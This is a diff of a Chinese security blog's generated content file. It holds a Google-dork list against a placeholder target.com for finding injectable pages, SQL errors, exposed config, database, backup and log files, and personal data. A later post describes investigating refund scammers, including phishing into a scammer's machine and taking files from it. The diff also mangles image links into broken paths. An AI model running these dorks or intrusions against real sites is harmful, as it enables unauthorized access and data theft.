-<h2 id="-9"><a href="#-9" class="headerlink" title=""></a></h2><h2 id="11-公开文件泄露"><a href="#11-公开文件泄露" class="headerlink" title="11.公开文件泄露"></a><strong>11.公开文件泄露</strong></h2><p>site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</p>
-<h2 id="-10"><a href="#-10" class="headerlink" title=""></a></h2><h2 id="12-邮箱信息"><a href="#12-邮箱信息" class="headerlink" title="12.邮箱信息"></a><strong>12.邮箱信息</strong></h2><p>site:target.com intext:@target.com<br>site:target.com 邮件<br>site:target.com email</p>
-<h2 id="-11"><a href="#-11" class="headerlink" title=""></a></h2><h2 id="13-社工信息"><a href="#13-社工信息" class="headerlink" title="13.社工信息"></a><strong>13.社工信息</strong></h2><p>site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="3-注入页面"><a href="#3-注入页面" class="headerlink" title="3.注入页面"></a><strong>3.注入页面</strong></h2><p>site:target.com inurl:php?id=</p>
+<h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><h2 id="4-编辑器页面"><a href="#4-编辑器页面" class="headerlink" title="4.编辑器页面"></a><strong>4.编辑器页面</strong></h2><p>site:target.com inurl:ewebeditor</p>
+<h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><h2 id="5-目录遍历漏洞"><a href="#5-目录遍历漏洞" class="headerlink" title="5.目录遍历漏洞"></a><strong>5.目录遍历漏洞</strong></h2><p>site:target.com intitle:index.of</p>
+<h2 id="-4"><a href="#-4" class="headerlink" title></a></h2><h2 id="6-SQL错误"><a href="#6-SQL错误" class="headerlink" title="6.SQL错误"></a><strong>6.SQL错误</strong></h2><p>site:target.com intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”<br>phpinfo()<br>site:target.com ext:php intitle:phpinfo “published by the PHP Group”</p>
+<h2 id="-5"><a href="#-5" class="headerlink" title></a></h2><h2 id="7-配置文件泄露"><a href="#7-配置文件泄露" class="headerlink" title="7.配置文件泄露"></a><strong>7.配置文件泄露</strong></h2><p>site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</p>
+<h2 id="-6"><a href="#-6" class="headerlink" title></a></h2><h2 id="8-数据库文件泄露"><a href="#8-数据库文件泄露" class="headerlink" title="8.数据库文件泄露"></a><strong>8.数据库文件泄露</strong></h2><p>site:target.com ext:.sql | .dbf | .mdb | .db</p>
+<h2 id="-7"><a href="#-7" class="headerlink" title></a></h2><h2 id="9-日志文件泄露"><a href="#9-日志文件泄露" class="headerlink" title="9.日志文件泄露"></a><strong>9.日志文件泄露</strong></h2><p>site:target.com ext:.log</p>
+<h2 id="-8"><a href="#-8" class="headerlink" title></a></h2><h2 id="10-备份和历史文件泄露"><a href="#10-备份和历史文件泄露" class="headerlink" title="10.备份和历史文件泄露"></a><strong>10.备份和历史文件泄露</strong></h2><p>site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</p>
+<h2 id="-9"><a href="#-9" class="headerlink" title></a></h2><h2 id="11-公开文件泄露"><a href="#11-公开文件泄露" class="headerlink" title="11.公开文件泄露"></a><strong>11.公开文件泄露</strong></h2><p>site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</p>
+<h2 id="-10"><a href="#-10" class="headerlink" title></a></h2><h2 id="12-邮箱信息"><a href="#12-邮箱信息" class="headerlink" title="12.邮箱信息"></a><strong>12.邮箱信息</strong></h2><p>site:target.com intext:@target.com<br>site:target.com 邮件<br>site:target.com email</p>
+<h2 id="-11"><a href="#-11" class="headerlink" title></a></h2><h2 id="13-社工信息"><a href="#13-社工信息" class="headerlink" title="13.社工信息"></a><strong>13.社工信息</strong></h2><p>site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
         <category>googlehack</category>
@@ -7061,7 +7061,7 @@ secure_file_priv没有设置时，则表示没有任何限制
 <p>其实是个钓鱼页面，输入的所有内容都会传到骗子那里。</p>
 <p>怎么确认是钓鱼网站的呢？随手输个账号密码都能进去。（当然，也有钓鱼网站会拿着你的密码去真实的网站登录，可以做到必须输入正确的账号密码才能进）</p>
 <p>进去之后会问你“退款银行”</p>
-<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
+<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
 <p>选择之后会让你填写资料，包括卡号，身份证、网银密码之类的。</p>
 <p>为什么要输入密码？它会告诉你要绑定“快捷退款”。</p>
 <img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/12.png">
@@ -7069,10 +7069,10 @@ secure_file_priv没有设置时，则表示没有任何限制
 
 
 <p>不过，他们会把银行卡密码称之为“退款密码”。</p>
-<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
+<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
 <p>最后再收个手机验证码，流程就跑完了。</p>
 <p>页面做得挺仔细，还要勾选同意一个服务协议，这观感，是正规网站没错了。/狗头</p>
-<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
+<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
 <p>一般来说，到了这个页面，钓鱼团伙会守在后台，实时把受害者输入的短信验证码拿到真正的银行网站去尝试，所以一旦提交，钱就没了。</p>
 <p>我把这个钓鱼网站的网址输入电脑，发现这么一句话：</p>
 <img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/13.png">
@@ -7096,12 +7096,12 @@ secure_file_priv没有设置时，则表示没有任何限制
 <p>水坑钓鱼不做太多概述，已经是老生常谈了</p>
 <p><strong>4</strong></p>
 <p>目标上线，机器上有360安全卫士。</p>
-<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
+<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
 <p>截图看一眼对方在做什么</p>
-<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
+<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
 <p>然后在对面机器上翻到了一些资料，准备深入研究下</p>
 <p>下图是从目标机器桌面上拿下来的文件</p>
-<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
+<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
 <p>这些诈骗分子应该是从电商渠道或快递渠道买到了宝妈们的信息，然后去一个个联系去实施诈骗行为</p>
 <img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/16.png">
 
@@ -7112,7 +7112,7 @@ secure_file_priv没有设置时，则表示没有任何限制
 
 <img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/19.png">
 
-<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
+<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
 <p>诈骗分子还有理赔话术，做的就和真的一样</p>
 <img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/20.png">
 
@@ -7125,7 +7125,7 @@ secure_file_priv没有设置时，则表示没有任何限制
 <img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/23.png">
 
 <p>最后定位IP</p>
-<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
+<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
 <p>最后问了朋友，云南边境的一些国家走的是我们国家的网络，所以这个云南的IP不一定是真实的位置，可能是在境外，到此为止，部分资料已移交给wj蜀黍</p>
 <p><strong>经过两天时间观察，我们已经知道了理赔类诈骗分子的套路：</strong></p>
 <p>1.诈骗分子会去购买快递或者电商数据，通过短信/电话方式联系受害者，关注公众号或者扫描二维码等等</p>
